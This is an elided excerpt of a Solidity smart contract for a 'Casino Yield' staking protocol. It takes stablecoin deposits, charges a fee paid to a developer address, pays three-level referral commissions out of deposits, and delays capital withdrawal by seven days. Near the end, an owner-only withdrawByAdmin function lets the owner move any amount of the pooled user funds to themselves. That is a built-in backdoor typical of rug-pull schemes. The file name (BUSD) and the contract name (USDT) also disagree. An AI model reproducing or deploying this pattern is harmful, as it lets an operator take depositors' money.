...
// File: contracts/casinoYield_BUSD.sol
...
/*
✅ Casino Yield BUSD Liquidity Protocol Official Smart Contract.
...
contract CasinoYieldUSDT is Ownable, Pausable, ReentrancyGuard {
    ...
    modifier whenStarted {
     ...
     constructor(address _devAddress, address _usdtContract) {      
    ...
    function deposit(uint256 _amount, address partner) external whenStarted whenNotPaused nonReentrant {
        ...
        IERC20(USDTContract).safeTransfer(devAddress, depositFee);
        
        _updateNotWithdrawn();
        stake[_msgSender()].stake = stake[_msgSender()].stake + (_amount - depositFee);

        totalInvested = totalInvested.add(_amount - depositFee);
        sendReferralAmount(msg.sender, (_amount - depositFee), true);
    ...
    function reinvest() external whenStarted nonReentrant {
        require(stake[_msgSender()].notWithdrawn > 100000000000000, "Too low amount to reinvest");
        require(!left[_msgSender()], "Left");
        _updateNotWithdrawn();
    ...
    function claimReward() public whenStarted whenNotPaused nonReentrant {
        ...
        stake[_msgSender()].notWithdrawn = 0;
        IERC20(USDTContract).safeTransfer(_msgSender(), amount);
    ...
    function sendReferralAmount(address investor, uint256 amount, bool isStakingReferral) internal {
        ...
        for(uint256 i = 0; i < 3; i++) {                
            ...
            IERC20(USDTContract).safeTransfer(_partner, (amount * (isStakingReferral ? STAKE_PERCENTAGES[i] : CLAIM_PERCENTAGES[i])).div(percentRate));
            _partner = stake[_partner].partner;
        }
    }
    ...
    function withdrawCapital() external {
        ...
        require(block.timestamp - stake[_msgSender()].timestamp > 7 days, "Error: Withdrawing your deposit balance is available 7 days after Leaving Casino Yield - Read FAQ");
    ...
    function withdrawByAdmin(uint256 amount) external onlyOwner {
        IERC20(USDTContract).safeTransfer(_msgSender(), amount);
    }
}